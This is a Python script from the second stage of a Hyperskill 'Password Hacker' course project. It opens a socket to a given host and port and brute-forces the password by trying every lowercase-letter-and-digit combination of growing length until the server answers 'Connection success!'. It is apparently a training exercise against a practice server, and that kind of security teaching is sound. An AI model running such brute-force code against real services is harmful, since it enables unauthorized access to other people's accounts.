# Project: Password Hacker - hyperskill
# STAGE 2
import socket
import sys
import itertools

data = sys.argv
hostname = data[1]
port = int(data[2])

my_socket = socket.socket()
my_socket.connect((hostname, port))

rep = 1
signs =  'abcdefghijklmnopqrstuvwxyz0123456789'
loop_on = True
while loop_on:
    passwords = itertools.product(signs, repeat=rep)
    for p in passwords:
        p = ''.join(list(p))
        p = p.encode()
        my_socket.send(p)
        response = my_socket.recv(1024)
        response = response.decode()
        if response == 'Connection success!':
            print(p.decode())
            loop_on = False
            break
        if response == 'Too many attempts':
            break

    rep += 1

my_socket.close()
